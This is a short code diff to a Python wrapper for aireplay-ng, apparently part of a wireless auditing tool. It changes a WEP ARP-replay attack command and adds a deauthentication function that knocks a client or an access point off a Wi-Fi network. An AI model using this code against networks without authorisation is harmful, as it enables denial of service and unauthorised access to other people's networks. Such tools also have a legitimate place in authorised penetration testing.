@@ -4,7 +4,7 @@
 from Configuration import Configuration
 from Process import Process
 
-import os
+import os, time
 
 class WEPAttackType(object):
     ''' Enumeration of different WEP attack types '''
@@ -162,10 +162,9 @@ class Aireplay(object):
                 cmd.extend(['-h', client_mac])
 
         elif attack_type == WEPAttackType.p0841:
-            cmd.append('--interactive')
+            cmd.append('--arpreplay')
             cmd.extend(['-b', target.bssid])
             cmd.extend(['-c', 'ff:ff:ff:ff:ff:ff'])
-            cmd.extend(['-t', '1'])
             cmd.extend(['-x', str(Configuration.wep_pps)])
             cmd.extend(['-F']) # Automatically choose first packet
             cmd.extend(['-p', '0841'])
@@ -228,6 +227,24 @@ class Aireplay(object):
             Color.pl('output:\n"%s"' % out)
             return None
 
+    @staticmethod
+    def deauth(target_bssid, client_mac=None, num_deauths=1, timeout=2):
+        deauth_cmd = [
+            'aireplay-ng',
+            '-0', # Deauthentication
+            str(num_deauths),
+            '--ignore-negative-one',
+            '-a', target_bssid # Target AP
+        ]
+        if client_mac is not None:
+            # Station-specific deauth
+            deauth_cmd.extend(['-c', client_mac])
+        deauth_cmd.append(Configuration.interface)
+        proc = Process(deauth_cmd)
+        while proc.poll() is None:
+            if proc.running_time() >= timeout:
+                proc.interrupt()
+            time.sleep(0.2)
 
 if __name__ == '__main__':
     t = WEPAttackType(4)
